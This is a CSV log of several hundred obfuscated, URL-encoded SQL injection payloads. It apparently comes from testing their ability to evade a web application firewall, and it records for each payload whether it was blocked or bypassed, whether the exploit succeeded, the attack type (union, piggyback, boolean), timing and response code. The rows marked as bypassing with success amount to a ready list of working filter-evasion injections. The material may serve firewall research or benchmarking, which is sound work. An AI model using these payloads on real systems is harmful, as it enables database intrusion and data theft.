Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@=.1+or%0b!+{x%0b(select%0b1)}=1=+(not+{x%0b(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0376,73.63,No,200
0%27<@=1.+or%0bnot%0b{x%0b(select+1)}=1=+(false)+or',Bypassed,No,None,booleanAtk,0.0144,73.63,No,500
0%27<@=1.+or+not~0=%0b(not%0b{a+1}=1)+or',Bypassed,No,None,Unknown,0.0255,73.63,No,500
0'<@!=1.%0b||%0b!%0b{a%0b1}=1=+(!+{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,Unknown,0.032,73.63,No,500
0'<@!=.1+or+not+{`if`+1}=1=%0b(!+{`if`+1}=1)+or%27,Bypassed,No,None,Unknown,0.0257,73.63,No,500
0'<@!=.1+or%0bnot+{x+(select+1)}=1=+(!~false)--+,Blocked,No,None,piggyAtk,0.007,73.63,No,403
0'<@=.1%0bor%0bnot%0b{x%0b(select%0b1)}=1=%0b(!%0b{x+(select+1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0112,73.63,No,500
0'<@=1.%0bor%0bnot+{x+(select+1)}=1=%0b(!%0b{x+(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0184,73.63,No,500
0%27<@!=.1+or+not+{x%0b(select%0b1)}=1=+(!%0b1)+or',Bypassed,No,None,Unknown,0.0195,73.63,No,500
0'<@=.1%0bor+not+{x+(select%0b1)}=1=%0b(not~0)%0b||%27,Bypassed,No,None,Unknown,0.015,73.63,No,500
0'<@=.1%0b||+not+{x%0b(select+1)}=1=+(0)%0bor',Bypassed,No,None,Unknown,0.0131,73.63,No,500
0%27<@!=.1+||+!+{x+(select+1)}=1=%0b(not+true)%0bor',Blocked,No,None,booleanAtk,0.0158,73.63,No,403
0'<@!=.1%0bor%0b!~false=%0b(!+{x+(select%0b1)}=1)+or%27,Bypassed,No,None,booleanAtk,0.013,73.63,No,500
0'<@=.1%0b||+not%0b{x%0b(select+1)}=1=%0b(not%0btrue)+or',Bypassed,No,None,booleanAtk,0.0116,73.63,No,500
0%27<@=1+||+!+{x+(select+1)}=1=%0b(not%0b{x+(select+1)}=1)%0b||%27,Blocked,No,None,Unknown,0.0126,73.63,No,403
0'<@!=.1+||+!%7efalse=%0b(false)--%0b,Bypassed,No,None,piggyAtk,0.0233,73.63,No,500
0'<@!=1+||%0bnot~0=%0b(!%0b{`if`%0b1}=1)--+,Bypassed,No,None,piggyAtk,0.0255,73.63,No,500
0%27<@=1.+or+not+true=+(not%0b1)+||',Bypassed,No,None,booleanAtk,0.0114,73.63,No,500
0'<@!=1+or%0bnot+{x%0b(select+1)}=1=+(not%0b{x+(select+1)}=1)--+,Bypassed,No,None,piggyAtk,0.0061,73.63,No,500
0%27<@!=1%0b||+not+{`if`%0b1}=1=+(not+{a+1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0236,73.63,No,200
0%27<@!=1.%0b||%0bnot%0b{x%0b(select+1)}=1=+(!+{x+(select+1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0113,73.63,No,200
0%27<@!=1+or+not%0b{x%0b(select+1)}=1=+(false)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0265,73.63,No,200
0%27<@=.1+or+not+{a%0b1}=1=+(!%0b{x+(select+1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0148,73.63,No,200
0%27<@!=1+or+not+{x+(select%0b1)}=1=+(not%0b{x+(select%0b1)}=1)--+,Blocked,No,None,piggyAtk,0.0241,73.63,No,403
0%27<@!=1%0bor%0b!%0b{x%0b(select+1)}=1=+(not+{a+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0153,73.63,No,200
0'<@=1+or%0b!+{x+(select%0b1)}=1=+(!+true)+or%27,Blocked,No,None,booleanAtk,0.0235,73.63,No,403
0%27<@!=.1%0b||%0bnot+{`if`+1}=1=%0b(!%0b{x%0b(select%0b1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0197,73.63,No,200
0%27<@!=1.+||+not%0b{`if`%0b1}=1=%0b(not+{a%0b1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0288,73.63,No,200
0%27<@=.1%0b||+not%0b{`if`+1}=1=+(!+{`if`+1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0172,73.63,No,200
0%27||%0b!@<@%0bor+1%0blike%0b{x%0b(select%0b1)}=1%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0192,73.63,No,200
0%27<@!=.1%0b||+!%0b{x+(select%0b1)}=1=+(!%7e0)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0216,73.63,No,200
0%27<@!=1.%0b||%0b!~0=+(!%0b{x+(select%0b1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0259,73.63,No,200
0'<@=1.+||+!%0b{x+(select+1)}=1=%0b(not+{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0242,73.63,No,500
0'<@!=1%0bor+not%0b1=%0b(not%0b{x%0b(select%0b1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0284,73.63,No,500
0'<@=.1+or%0b!%7e0=%0b(false)%0bor',Bypassed,No,None,booleanAtk,0.0262,73.63,No,500
0%27<@=.1+||%0bnot+{x+(select+1)}=1=%0b(not%0b{x+(select+1)}=1)%0bor%27,Blocked,No,None,Unknown,0.0087,73.63,No,403
0%27<@!=1.+or%0b!%7efalse=+(!+{a+1}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0161,73.63,No,200
0%27<@!=1.+||%0b!%0b{a+1}=1=%0b(not~0)%0bor',Bypassed,No,None,Unknown,0.0306,73.63,No,500
0'||+1<@.+or%0bnot+1=+(not+{`if`+1}=1)+||%27,Blocked,No,None,Unknown,0.0108,73.63,No,403
0%27<@!=1.%0bor%0b!+true=%0b(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0169,73.63,No,500
0'<@!=.1+or+!~false=%0b(!%0b{a%0b1}=1)%0bor%27,Bypassed,No,None,booleanAtk,0.0139,73.63,No,500
0'<@=1+||%0bnot%0b{x%0b(select%0b1)}=1=+(not+{a+1}=1)%0bor%27,Blocked,No,None,Unknown,0.0087,73.63,No,403
0%27<@!=.1%0bor+!+{x+(select+1)}=1=%0b(not%0btrue)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0239,73.63,No,200
0%27<@=1+or+!+true=+(not%7e0)+or',Bypassed,No,None,booleanAtk,0.0247,73.63,No,500
0'<@=.1%0bor%0bnot+{x+(select+1)}=1=%0b(not%0b{a+1}=1)+or%27,Bypassed,No,None,Unknown,0.0155,73.63,No,500
0'<@=.1+or%0b!~0=+(not%0b{`if`%0b1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0155,73.63,No,500
0'<@=.1%0bor+!%0b{`if`+1}=1=+(!%7e0)+or',Bypassed,No,None,Unknown,0.0218,73.63,No,500
0'<@!=.1+||+not%0b{x%0b(select%0b1)}=1=%0b(not~false)%0b||%27,Bypassed,No,None,Unknown,0.0176,73.63,No,500
0%27<@=.1+||%0b!%7efalse=%0b(not%0b{`if`%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.018,73.63,No,200
0'<@=1.%0b||%0bnot%0b1=%0b(not+{x%0b(select%0b1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0135,73.63,No,500
0'<@!=.1%0bor%0bnot%0b{x%0b(select%0b1)}=1=+(not+1)%0b||',Bypassed,No,None,Unknown,0.0198,73.63,No,500
0'<@!=1%0bor+not%0b{x%0b(select%0b1)}=1=+(!+{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.0225,73.63,No,500
0'<@!=.1%0b||%0b{`if`%0b1}=1+like%0b{x+(select+1)}=1+or',Bypassed,No,None,Unknown,0.0166,73.63,No,500
0'<@=1%0b||%0bnot+{a%0b1}=1=%0b(not%7efalse)+||',Bypassed,No,None,Unknown,0.0196,73.63,No,500
5%0b||+!+{x%0b(select%0b1)}=1=+(!%0b{x+(select+1)}=1)--%0b,Blocked,No,None,piggyAtk,0.0185,73.63,No,403
0'<@=1.%0bor+!+1=+(false)+||%27,Bypassed,No,None,booleanAtk,0.0338,73.63,No,500
0%27<@!=.1%0b||%0bnot+1=+(not+{a+1}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0298,73.63,No,200
0%27<@!=.1%0b||%0b!%0b{x+(select%0b1)}=1=+(!+{a+1}=1)+||',Bypassed,No,None,Unknown,0.016,73.63,No,500
0'<@!=1.+||+!%0b{x%0b(select+1)}=1=%0b(!%0b{a+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0189,73.63,No,500
0%27<@!=1%0bor%0b!+1=%0b(!%7e0)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0121,73.63,No,200
0%27<@=1.+or+not%0b{x+(select%0b1)}=1=+(not+{x%0b(select+1)}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0128,73.63,No,200
0'<@!=.1%0bor%0b!%0b1=%0b(!+1)--+,Bypassed,No,None,piggyAtk,0.0091,73.63,No,500
0%27<@=.1+or+!+{x+(select%0b1)}=1=+(not%7efalse)%0b||%27,Blocked,No,None,booleanAtk,0.0144,73.63,No,403
0%27<@=1%0bor+!%0b{x+(select%0b1)}=1=%0b(not~0)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0163,73.63,No,200
0%27<@!=1.+||+not+{x%0b(select%0b1)}=1=%0b(false)+||',Bypassed,No,None,Unknown,0.0113,73.63,No,500
0'or%0b@<@.+||+not%0btrue=+(not+true)+or',Bypassed,No,None,booleanAtk,0.0111,73.63,No,500
0'<@!=1%0bor%0bnot+{`if`+1}=1=%0b(not+{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.0162,73.63,No,500
0%27<@=.1%0b||%0b{x+(select+1)}=1%0blike%0b{x+(select+1)}=1+||',Bypassed,No,None,Unknown,0.0158,73.63,No,500
0%27<@=1.%0bor%0b!+{x%0b(select+1)}=1=%0b(not+{a+1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0263,73.63,No,200
0%27<@!=1+||%0b!%0b{a+1}=1=%0b(!+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0111,73.63,No,500
0'<@!=1%0bor+not+{x+(select+1)}=1=%0b(false)%0b||',Bypassed,No,None,booleanAtk,0.0233,73.63,No,500
0%27<@!=1%0b||+not%0b{x%0b(select+1)}=1=%0b(not~0)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.02,73.63,No,200
0%27<@=.1+or%0bnot%0b1=+(not%0b{x+(select+1)}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.017,73.63,No,200
0%27<@=.1+||%0b!+{a+1}=1=+(!+1)+or',Bypassed,No,None,Unknown,0.0148,73.63,No,500
0'<@!=.1%0bor%0b0=%0b(not+{x%0b(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.0156,73.63,No,500
0%27<@=.1%0b||+not%0b{x+(select+1)}=1=+(!%0b{x+(select+1)}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0211,73.63,No,200
0'<@!=1+||%0bnot%0b{x+(select+1)}=1=+(!+true)+or%27,Blocked,No,None,booleanAtk,0.0165,73.63,No,403
0%27<@=.1%0bor+!+1=+(!+{`if`+1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0245,73.63,No,200
0'<@!=1+or+!+true=%0b(!%0b{x%0b(select+1)}=1)+or%27,Bypassed,No,None,booleanAtk,0.0335,73.63,No,500
0'<@=1+||%0b!%0btrue=%0b(false)%23,Blocked,No,None,piggyAtk,0.0093,73.63,No,403
0'<@!=.1%0bor+!%0btrue=+(!%0b{x+(select+1)}=1)--+,Bypassed,No,None,piggyAtk,0.013,73.63,No,500
0'<@=1.+or+!+1=%0b(not+{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0213,73.63,No,500
0%27<@=1.%0b||+not+{x%0b(select+1)}=1=+(not%0b{x+(select+1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0188,73.63,No,200
0'<@!=.1%0bor+!%0b{x%0b(select+1)}=1=+(not+{a+1}=1)+or',Bypassed,No,None,Unknown,0.0207,73.63,No,500
0%27<@!=.1+or+1%0blike%0b{a%0b1}=1+or',Bypassed,No,None,Unknown,0.0213,73.63,No,500
0%27<@=1.+or+!%0b1=%0b(not+{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0124,73.63,No,500
0'<@=1%0bor%0b{`if`+1}=1+like%0b{`if`+1}=1+||',Bypassed,No,None,Unknown,0.0099,73.63,No,500
0%27<@!=1%0b||%0b!+{x+(select%0b1)}=1=%0b(not+{a+1}=1)+||',Bypassed,No,None,Unknown,0.0152,73.63,No,500
0%27<@!=1%0bor+not%0b{`if`%0b1}=1=%0b(!%7efalse)+or',Bypassed,No,None,booleanAtk,0.0214,73.63,No,500
0'<@!=1+or%0b!%0b{a+1}=1=+(!%0b{x%0b(select%0b1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0162,73.63,No,500
0%27<@=1.%0b||%0b!%0b{`if`%0b1}=1=%0b(not+{x%0b(select+1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0242,73.63,No,200
0%27<@!=.1+or%0bnot%0b{x%0b(select+1)}=1=+(not%0b{`if`%0b1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0161,73.63,No,200
0%27<@!=.1%0bor+!+{`if`%0b1}=1=%0b(not+{x%0b(select+1)}=1)+or',Bypassed,No,None,Unknown,0.012,73.63,No,500
0%27<@!=1+||+not%0b{`if`%0b1}=1=+(!+{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0179,73.63,No,500
0%27<@!=1+or%0bnot+{x%0b(select+1)}=1=%0b(not%0b{x+(select%0b1)}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0365,73.63,No,200
0'<@!=.1%0bor+not%0b{`if`+1}=1=%0b(!+{x%0b(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0183,73.63,No,500
0%27<@=1.%0bor+not~false=+(!%0b{x+(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0208,73.63,No,200
0'<@!=1.%0b||+!%7e0=+(not+{`if`%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0096,73.63,No,500
0'<@!=.1+or%0b!+{`if`+1}=1=+(not%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0173,73.63,No,500
0'<@=1+or+!+{x%0b(select+1)}=1=%0b(not%0btrue)%23,Bypassed,No,None,piggyAtk,0.0132,73.63,No,500
0%27<@=.1+or+not%0b{a%0b1}=1=%0b(not+{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0238,73.63,No,500
0%27<@=.1%0b||%0bnot%0b{x+(select%0b1)}=1=%0b(not+{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0234,73.63,No,500
0'<@!=1%0bor+!%0b{x%0b(select%0b1)}=1=+(not+{x%0b(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0192,73.63,No,500
0%27<@=1.%0b||%0bnot+{`if`%0b1}=1=+(not+true)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0186,73.63,No,200
0%27<@!=1+or%0b!+{a%0b1}=1=+(not%0b{x%0b(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0277,73.63,No,200
0'<@=.1%0b||%0bnot+{a+1}=1=%0b(!+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0176,73.63,No,500
0%27<@=.1+or+not+{`if`%0b1}=1=+(!+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0081,73.63,No,500
0'<@!=1.%0bor%0bnot+{`if`%0b1}=1=%0b(not+{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0215,73.63,No,500
0%27<@!=.1%0bor+not%0b1=%0b(not+{`if`+1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0325,73.63,No,200
0'<@!=1.+or+not%0b{x+(select+1)}=1=+(!+{x+(select+1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.014,73.63,No,500
0'<@=1.+||+!+{x%0b(select%0b1)}=1=+(!+{x+(select+1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0091,73.63,No,500
0'<@!=.1%0bor+0%0bis%0bfalse%0b||%27,Bypassed,No,None,booleanAtk,0.0188,73.63,No,500
0%27<@!=1.%0b||%0b!+{x%0b(select%0b1)}=1=+(not%0b{a%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.018,73.63,No,200
0'<@=1.+or%0b!+{a%0b1}=1=+(not+{x%0b(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0182,73.63,No,500
0'<@=.1%0bor+not+true=+(not+{x%0b(select%0b1)}=1)+or',Bypassed,No,None,booleanAtk,0.0072,73.63,No,500
0'<@!=1+||+not%0btrue=%0b(!%0b{`if`%0b1}=1)--+,Bypassed,No,None,piggyAtk,0.0102,73.63,No,500
0%27<@!=1.+or%0b{`if`+1}=1+like%0btrue%0b||',Bypassed,No,None,booleanAtk,0.027,73.63,No,500
0%27<@!=.1+||+!%0b{`if`+1}=1=+(not+{a%0b1}=1)%0bor',Bypassed,No,None,Unknown,0.0104,73.63,No,500
0%27<@=1.+||%0bnot%0b{`if`+1}=1=%0b(!+{a+1}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0183,73.63,No,200
0'<@!=1.+||%0b!%0b{a+1}=1=%0b(!+{`if`+1}=1)%0bor',Bypassed,No,None,Unknown,0.027,73.63,No,500
0%27<@=1+||+{x+(select+1)}=1%0blike%0b{x%0b(select+1)}=1+||',Blocked,No,None,Unknown,0.0106,73.63,No,403
0%27<@=.1+or+not%0b{x%0b(select%0b1)}=1=%0b(!+{x+(select%0b1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0317,73.63,No,200
0'<@=1+||+!+{a%0b1}=1=+(!%0b{x+(select%0b1)}=1)--%0b,Bypassed,No,None,piggyAtk,0.0159,73.63,No,500
0%27<@!=.1%0bor+!+{x%0b(select%0b1)}=1=%0b(!%0b{x+(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0177,73.63,No,500
0'or+@<@.+or+not%0b{a+1}=1=+(!+{x+(select+1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0231,73.63,No,500
0%27<@!=1%0b||+not+{x+(select+1)}=1=+(not%0b{`if`%0b1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0261,73.63,No,200
0'<@=.1+or%0b!%0b{a%0b1}=1=+(!%0b{a+1}=1)%23,Bypassed,No,None,piggyAtk,0.0273,73.63,No,500
0%27<@!=1+or%0b!~0=+(not+{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0234,73.63,No,500
0'<@=1+or%0b{x%0b(select+1)}=1+like+{x%0b(select%0b1)}=1+or%27,Bypassed,No,None,Unknown,0.0265,73.63,No,500
0%27<@!=1.+||%0b!+{x%0b(select+1)}=1=+(!%0b{x+(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0156,73.63,No,200
0'<@=1.+or%0bnot%0b{`if`%0b1}=1=%0b(not+{`if`+1}=1)%0bor',Bypassed,No,None,Unknown,0.0459,73.63,No,500
0%27<@=.1+or+!%0b{x%0b(select%0b1)}=1=+(!%0b{a+1}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0352,73.63,No,200
0%27<@=1%0b||%0b!+{`if`+1}=1=+(not+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0225,73.63,No,500
0%27<@!=1.%0b||+not+{a+1}=1=%0b(!+{a+1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0168,73.63,No,200
0'<@!=1.+or%0b!+{x+(select%0b1)}=1=+(not+{x%0b(select+1)}=1)--+,Blocked,No,None,piggyAtk,0.0072,73.63,No,403
0%27<@=.1%0bor+!%0b{`if`%0b1}=1=+(not+{x+(select+1)}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0165,73.63,No,200
0'<@!=1.+or%0b!%0b{x+(select+1)}=1=%0b(not%0b{a+1}=1)%0bor%27,Blocked,No,None,Unknown,0.0123,73.63,No,403
0'<@!=.1%0bor+not+{`if`+1}=1=%0b(!%0b{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0372,73.63,No,500
0%27<@!=.1%0bor%0bnot+1=%0b(not%7efalse)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0099,73.63,No,200
0'<@=1.%0b||%0b!%0b1=%0b(!%0b{`if`+1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0188,73.63,No,500
0%27<@=1+||+not%7efalse=%0b(not+{a%0b1}=1)+||',Bypassed,No,None,Unknown,0.0252,73.63,No,500
0%27<@!=1.+or+not+{x%0b(select+1)}=1=+(not%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0128,73.63,No,500
0'<@!=1+||+not%0b{`if`+1}=1=%0b(!+{`if`%0b1}=1)%23,Bypassed,No,None,piggyAtk,0.0171,73.63,No,500
0%27<@!=1+or%0bnot%0b{x%0b(select%0b1)}=1=%0b(!+{`if`+1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0236,73.63,No,200
0%27<@=1.+or+not~false=+(not~false)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0273,73.63,No,200
0%27<@!=1.+||+not%0b{x+(select%0b1)}=1=%0b(not+true)+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0173,73.63,No,200
0'<@!=1+or%0b!%7efalse=+(false)%0bor%27,Blocked,No,None,booleanAtk,0.0105,73.63,No,403
0%27<@!=.1%0bor+!~0=+(!%0b{`if`+1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0204,73.63,No,200
0'<@!=.1+||%0bnot%0b{`if`%0b1}=1=%0b(not%0b{a+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0133,73.63,No,500
0'<@=.1%0b||%0bnot+{`if`%0b1}=1=+(not+{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0214,73.63,No,500
0%27<@!=1%0b||%0bfalse=%0b(not%0b{x+(select%0b1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0203,73.63,No,200
0'<@!=1%0bor+not%7e0=+(!+{x%0b(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0121,73.63,No,500
0%27<@=1.+or+not+{x+(select+1)}=1=%0b(!+{x+(select+1)}=1)%0b||',Blocked,No,None,Unknown,0.0066,73.63,No,403
0'<@!=.1+||+!%0b{`if`%0b1}=1=%0b(not+{a+1}=1)+or%27,Bypassed,No,None,Unknown,0.0235,73.63,No,500
0'<@!=1.%0bor%0bnot%0b{x%0b(select+1)}=1=%0b(!%0b{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0151,73.63,No,500
0%27<@!=1+||%0b!+{x+(select+1)}=1=+(not%0b{x%0b(select%0b1)}=1)%23,Blocked,No,None,piggyAtk,0.0085,73.63,No,403
0'<@!=1.+or+!+{a+1}=1=%0b(not~false)%0b||%27,Bypassed,No,None,booleanAtk,0.0166,73.63,No,500
0'<@!=.1%0b||%0b{a%0b1}=1+like%0b{a+1}=1%0bor%27,Bypassed,No,None,Unknown,0.0101,73.63,No,500
0'<@!=1.+||+!%0b{x%0b(select+1)}=1=%0b(not+{x+(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.0157,73.63,No,500
0%27<@=1.+||+!%0b{a%0b1}=1=%0b(!+1)+or',Bypassed,No,None,Unknown,0.0117,73.63,No,500
0%27<@=1+or+{x+(select+1)}=1%0blike%0b{`if`+1}=1--%0b,Blocked,No,None,piggyAtk,0.0113,73.63,No,403
0'<@=.1+||+!+{a%0b1}=1=+(not+1)--%0b,Blocked,No,None,piggyAtk,0.0119,73.63,No,403
0%27<@!=1+or%0b!~false=%0b(!+1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0094,73.63,No,200
0'<@=1+or+not%0b{x%0b(select%0b1)}=1=+(!+{x+(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.0235,73.63,No,500
0'<@!=1%0b||+not+{`if`+1}=1=+(not+true)--%0b,Bypassed,No,None,piggyAtk,0.0097,73.63,No,500
0'<@!=1.+or%0b!+{a%0b1}=1=+(not%0b{`if`%0b1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0151,73.63,No,500
0%27<@=1%0b||+!%7efalse=%0b(not+{a%0b1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0188,73.63,No,200
0%27<@!=.1+||+!+1=%0b(!%7e0)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0122,73.63,No,200
0%27<@!=1%0bor%0b{a%0b1}=1%0blike%0b{a+1}=1+or',Bypassed,No,None,Unknown,0.0237,73.63,No,500
0%27<@!=1%0bor%0b!+{x%0b(select+1)}=1=+(not+1)%0b||',Bypassed,No,None,Unknown,0.0188,73.63,No,500
0%27<@!=.1%0bor%0b!%0b{x%0b(select+1)}=1=%0b(!+{x+(select+1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0207,73.63,No,200
0%27<@!=1+||+!%0btrue=%0b(!+{`if`+1}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0213,73.63,No,200
0%27<@=.1+or%0b!+{x+(select+1)}=1=%0b(not%0b{x%0b(select+1)}=1)%0bor%27,Blocked,No,None,Unknown,0.0152,73.63,No,403
0'<@!=.1+or+not+{x+(select+1)}=1=%0b(not~0)--+,Blocked,No,None,piggyAtk,0.0256,73.63,No,403
0%27<@=.1+or%0bnot+{x+(select+1)}=1=%0b(!+{a+1}=1)%23,Blocked,No,None,piggyAtk,0.0178,73.63,No,403
0%27<@!=.1%0bor%0bfalse=%0b(!~0)%0bor',Bypassed,No,None,booleanAtk,0.0204,73.63,No,500
0'<@=1.+or%0btrue%0blike+{x+(select+1)}=1%0b||%27,Bypassed,No,None,booleanAtk,0.0176,73.63,No,500
0%27<@!=1+or+{x%0b(select+1)}=1%0blike+{x+(select+1)}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.0329,73.63,No,200
0%27<@!=1%0bor+not%0b{x+(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0292,73.63,No,500
0%27<@=1.+or%0b{`if`%0b1}=1%0blike%0b{x%0b(select%0b1)}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.0108,73.63,No,200
0%27<@=.1+or%0b!%0btrue=%0b(not~false)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0143,73.63,No,200
0'<@=.1%0b||+not%0b{x+(select+1)}=1=%0b(not+{x+(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.0162,73.63,No,500
0'<@!=.1+||%0b!%0b{`if`%0b1}=1=+(not+{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0311,73.63,No,500
0%27<@=1.+||+!+{`if`%0b1}=1=%0b(not+{x%0b(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0209,73.63,No,200
0%27<@=1+or+not+{a%0b1}=1=+(not%0b{x+(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0184,73.63,No,500
0%27<@=.1%0bor+not%0btrue=%0b(!+{x%0b(select%0b1)}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0196,73.63,No,200
